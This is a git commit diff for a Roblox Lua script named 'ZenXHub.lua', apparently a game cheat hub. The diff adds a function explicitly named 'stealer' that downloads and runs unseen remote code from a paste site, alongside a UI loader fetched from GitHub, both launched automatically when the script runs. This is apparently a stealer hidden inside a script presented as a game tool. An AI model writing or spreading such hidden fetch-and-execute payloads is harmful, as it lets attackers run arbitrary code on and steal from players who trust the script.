6089f6d6633e7951b929f6659d88e1a2d6537c75
DupeSpawn <ianzzz99999@gmail.com>
2025-07-24 22:21:52 +0800

    Update ZenXHub.lua

--- ZenXHub.lua
+++ ZenXHub.lua
@@ -1,1 +1,10 @@
-loadstring(game:HttpGet("https://pastefy.app/ObavhcLI/raw"))()
+local function stealer()
+    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/'))() -- loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/EtIO92U6BXO9PP9H/raw", true))()
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
